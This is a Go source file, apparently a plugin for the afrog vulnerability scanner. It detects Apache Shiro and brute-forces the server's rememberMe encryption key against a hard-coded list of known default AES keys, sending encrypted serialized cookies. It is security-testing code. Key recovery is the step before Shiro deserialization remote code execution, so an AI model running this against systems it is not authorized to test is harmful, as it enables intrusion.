package gox

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"encoding/base64"
	"errors"
	"io"
	"net/http"
	"net/url"
	"strings"

	"github.com/zan8in/afrog/v3/pkg/proto"
)

var shiroCheckPayload = []byte{
	0xac, 0xed, 0x00, 0x05, 0x73, 0x72, 0x00, 0x32, 0x6f, 0x72, 0x67, 0x2e, 0x61, 0x70, 0x61, 0x63,
	0x68, 0x65, 0x2e, 0x73, 0x68, 0x69, 0x72, 0x6f, 0x2e, 0x73, 0x75, 0x62, 0x6a, 0x65, 0x63, 0x74,
	0x2e, 0x53, 0x69, 0x6d, 0x70, 0x6c, 0x65, 0x50, 0x72, 0x69, 0x6e, 0x63, 0x69, 0x70, 0x61, 0x6c,
	0x43, 0x6f, 0x6c, 0x6c, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0xa8, 0x7f, 0x58, 0x25, 0xc6, 0xa3,
	0x08, 0x4a, 0x03, 0x00, 0x01, 0x4c, 0x00, 0x0f, 0x72, 0x65, 0x61, 0x6c, 0x6d, 0x50, 0x72, 0x69,
	0x6e, 0x63, 0x69, 0x70, 0x61, 0x6c, 0x73, 0x74, 0x00, 0x0f, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f,
	0x75, 0x74, 0x69, 0x6c, 0x2f, 0x4d, 0x61, 0x70, 0x3b, 0x78, 0x70, 0x70, 0x77, 0x01, 0x00, 0x78,
}

const (
	shiroModeCBC = "cbc"
	shiroModeGCM = "gcm"
)

var shiroDefaultKeys = shiroUniqueKeys([]string{
	"kPH+bIxk5D2deZiIxcaaaA==",
	"2AvVhdsgUs0FSA3SDFAdag==",
	"3AvVhmFLUs0KTA3Kprsdag==",
	"4AvVhmFLUs0KTA3Kprsdag==",
	"5AvVhmFLUs0KTA3Kprsdag==",
	"6AvVhmFLUs0KTA3Kprsdag==",
	"7AvVhmFLUs0KTA3Kprsdag==",
	"8AvVhmFLUs0KTA3Kprsdag==",
	"9AvVhmFLUs0KTA3Kprsdag==",
	"0AvVhmFLUs0KTA3Kprsdag==",
	"1AvVhdsgUs0FSA3SDFAdag==",
	"4AvVhdsgUs0FSA3SDFAdag==",
	"wGiHplamyXlVB11UXWol8g==",
	"Z3VucwAAAAAAAAAAAAAAAA==",
	"MTIzNDU2Nzg5MGFiY2RlZg==",
	"U3ByaW5nQmxhZGUAAAAAAAAAAAAA",
	"fCq+/xW488hMTCD+cmJ3aQ==",
	"bWljcm9zAAAAAAAAAAAAAA==",
	"bWluZS1hc3NldC1rZXk6QQ==",
	"ZnJhbmsAAAAAAAAAAAAAAAA=",
	"YmxhZGUAAAAAAAAAAAAAAAA=",
	"YWxwaGEAAAAAAAAAAAAAAAA=",
	"a2V5AAAAAAAAAAAAAAAAAAAAAA==",
	"c2hpcm8AAAAAAAAAAAAAAAAA",
	"c2hpcm8tc2VjcmV0LWtleQ==",
})

type shiroRememberMeCandidate struct {
	mode  string
	value string
}

func shiro_key(target string, variableMap map[string]any) error {
	variableMap["request"] = nil
	variableMap["response"] = nil

	fulltarget, err := shiroNormalizeTarget(target)
	if err != nil {
		return err
	}

	shiroDetected, detReq, detResp, _, err := shiroDetect(fulltarget)
	if err != nil {
		return err
	}
	if detReq != nil {
		variableMap["request"] = detReq
	}
	if detResp != nil {
		variableMap["response"] = detResp
	}
	setTarget(fulltarget, variableMap)
	setFullTarget(fulltarget, variableMap)

	if !shiroDetected {
		return nil
	}

	for _, keyB64 := range shiroDefaultKeys {
		key, err := base64.StdEncoding.DecodeString(keyB64)
		if err != nil {
			continue
		}

		for _, candidate := range shiroRememberMeCandidates(key) {
			ok, vmap, err := shiroConfirmKey(fulltarget, key, candidate)
			if err != nil {
				continue
			}
			if !ok {
				continue
			}

			if v := vmap["request"]; v != nil {
				variableMap["request"] = v
			}
			if v := vmap["response"]; v != nil {
				variableMap["response"] = v
			}

			setTarget(fulltarget, variableMap)
			setFullTarget(fulltarget, variableMap)

			shiroInjectKeyMarker(variableMap, keyB64)
			return nil
		}
	}

	return nil
}

func shiroNormalizeTarget(target string) (string, error) {
	u, err := url.Parse(target)
	if err != nil {
		return "", err
	}
	if u.Scheme == "" || u.Host == "" {
		return "", errors.New("invalid target")
	}
	if u.Path == "" {
		u.Path = "/"
	}
	return u.String(), nil
}

func shiroDetect(target string) (bool, any, any, bool, error) {
	ok, req, resp, err := shiroDetectWithFollow(target, true)
	if err != nil {
		return false, req, resp, false, err
	}
	if ok {
		return true, req, resp, true, nil
	}

	ok2, req2, resp2, err2 := shiroDetectWithFollow(target, false)
	if err2 != nil {
		return false, req2, resp2, false, err2
	}
	if ok2 {
		return true, req2, resp2, false, nil
	}

	if req != nil || resp != nil {
		return false, req, resp, false, nil
	}
	return false, req2, resp2, false, nil
}

func shiroDetectWithFollow(target string, followRedirects bool) (bool, any, any, error) {
	invalidValues := []string{"123", "1", "dGVzdA=="}
	var anyReq any
	var anyResp any
	hitCount := 0

	for _, v := range invalidValues {
		vmap := make(map[string]any)
		headers := map[string]string{
			"Cookie": "JSESSIONID=" + shiroRandLower(8) + ";rememberMe=" + v + ";",
		}
		resp, err := DoHTTP(http.MethodGet, target, nil, headers, followRedirects, vmap)
		if anyReq == nil {
			anyReq = vmap["request"]
		}
		if anyResp == nil {
			anyResp = vmap["response"]
		}
		if err != nil || resp == nil {
			continue
		}
		if shiroHasDeleteMe(resp) {
			hitCount++
			anyReq = vmap["request"]
			anyResp = vmap["response"]
			if hitCount >= 2 {
				return true, anyReq, anyResp, nil
			}
		}
	}

	return false, anyReq, anyResp, nil
}

func shiroHasDeleteMe(resp *proto.Response) bool {
	if resp == nil {
		return false
	}
	if sc := strings.ToLower(resp.GetHeaders()["set-cookie"]); strings.Contains(sc, "rememberme=deleteme") {
		return true
	}
	h := strings.ToLower(string(resp.GetRawHeader()))
	return strings.Contains(h, "rememberme=deleteme")
}

func shiroRememberMeCandidates(key []byte) []shiroRememberMeCandidate {
	modes := []string{shiroModeCBC, shiroModeGCM}
	candidates := make([]shiroRememberMeCandidate, 0, len(modes))
	for _, mode := range modes {
		value, err := shiroEncryptRememberMe(shiroCheckPayload, key, mode)
		if err != nil {
			continue
		}
		candidates = append(candidates, shiroRememberMeCandidate{
			mode:  mode,
			value: value,
		})
	}
	return candidates
}

func shiroEncryptRememberMe(plaintext []byte, key []byte, mode string) (string, error) {
	switch mode {
	case shiroModeGCM:
		return shiroEncryptRememberMeGCM(plaintext, key)
	default:
		return shiroEncryptRememberMeCBC(plaintext, key)
	}
}

func shiroEncryptRememberMeCBC(plaintext []byte, key []byte) (string, error) {
	if len(key) != 16 && len(key) != 24 && len(key) != 32 {
		return "", errors.New("invalid aes key length")
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	iv := make([]byte, aes.BlockSize)
	if _, err := crand.Read(iv); err != nil {
		return "", err
	}

	padded, err := shiroPKCS7Pad(plaintext, aes.BlockSize)
	if err != nil {
		return "", err
	}

	out := make([]byte, len(padded))
	cipher.NewCBCEncrypter(block, iv).CryptBlocks(out, padded)
	return base64.StdEncoding.EncodeToString(append(iv, out...)), nil
}

func shiroEncryptRememberMeGCM(plaintext []byte, key []byte) (string, error) {
	if len(key) != 16 && len(key) != 24 && len(key) != 32 {
		return "", errors.New("invalid aes key length")
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	nonce := make([]byte, 16)
	if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
		return "", err
	}

	aead, err := cipher.NewGCMWithNonceSize(block, 16)
	if err != nil {
		return "", err
	}

	return base64.StdEncoding.EncodeToString(append(nonce, aead.Seal(nil, nonce, plaintext, nil)...)), nil
}

func shiroConfirmKey(target string, key []byte, candidate shiroRememberMeCandidate) (bool, map[string]any, error) {
	controlRememberMe, err := shiroEncryptRememberMe(shiroCheckPayload, shiroWrongKey(key), candidate.mode)
	if err != nil {
		return false, nil, err
	}

	var lastVars map[string]any
	for i := 0; i < 2; i++ {
		// Evaluate the first response only. Redirect targets often set their own
		// rememberMe cookies and can hide the key-validation result.
		resp, vmap, err := shiroDoRememberMeRequest(target, candidate.value, false)
		if err != nil {
			return false, nil, err
		}
		if shiroHasDeleteMe(resp) {
			return false, nil, nil
		}

		controlResp, _, err := shiroDoRememberMeRequest(target, controlRememberMe, false)
		if err != nil {
			return false, nil, err
		}
		if !shiroHasDeleteMe(controlResp) {
			return false, nil, nil
		}

		lastVars = vmap
	}

	return true, lastVars, nil
}

func shiroDoRememberMeRequest(target string, rememberMe string, followRedirects bool) (*proto.Response, map[string]any, error) {
	headers := map[string]string{
		"Cookie": "rememberMe=" + rememberMe + ";",
	}

	vmap := make(map[string]any)
	resp, err := DoHTTP(http.MethodGet, target, nil, headers, followRedirects, vmap)
	if err != nil {
		return nil, nil, err
	}
	if resp == nil {
		return nil, nil, errors.New("empty response")
	}
	return resp, vmap, nil
}

func shiroWrongKey(key []byte) []byte {
	wrong := append([]byte(nil), key...)
	if len(wrong) == 0 {
		return wrong
	}
	wrong[0] ^= 0x01
	return wrong
}

func shiroUniqueKeys(keys []string) []string {
	seen := make(map[string]struct{}, len(keys))
	out := make([]string, 0, len(keys))
	for _, key := range keys {
		if _, ok := seen[key]; ok {
			continue
		}
		seen[key] = struct{}{}
		out = append(out, key)
	}
	return out
}

func shiroPKCS7Pad(in []byte, blockSize int) ([]byte, error) {
	if blockSize <= 0 || blockSize >= 256 {
		return nil, errors.New("invalid block size")
	}
	padLen := blockSize - (len(in) % blockSize)
	if padLen == 0 {
		padLen = blockSize
	}
	padding := bytes.Repeat([]byte{byte(padLen)}, padLen)
	return append(in, padding...), nil
}

func shiroRandLower(n int) string {
	if n <= 0 {
		return ""
	}
	const letters = "abcdefghijklmnopqrstuvwxyz"
	b := make([]byte, n)
	if _, err := crand.Read(b); err != nil {
		for i := range b {
			b[i] = 'a'
		}
		return string(b)
	}
	for i := range b {
		b[i] = letters[int(b[i])%len(letters)]
	}
	return string(b)
}

func shiroInjectKeyMarker(variableMap map[string]any, keyB64 string) {
	marker := []byte("\nShiroKey:" + keyB64)
	if v := variableMap["response"]; v != nil {
		if resp, ok := v.(*proto.Response); ok && resp != nil {
			resp.Raw = append(resp.Raw, marker...)
			resp.Body = append(resp.Body, marker...)
			return
		}
	}
	setResponse("ShiroKey:"+keyB64, variableMap)
}

func init() {
	funcMap["shiro_key"] = shiro_key
}
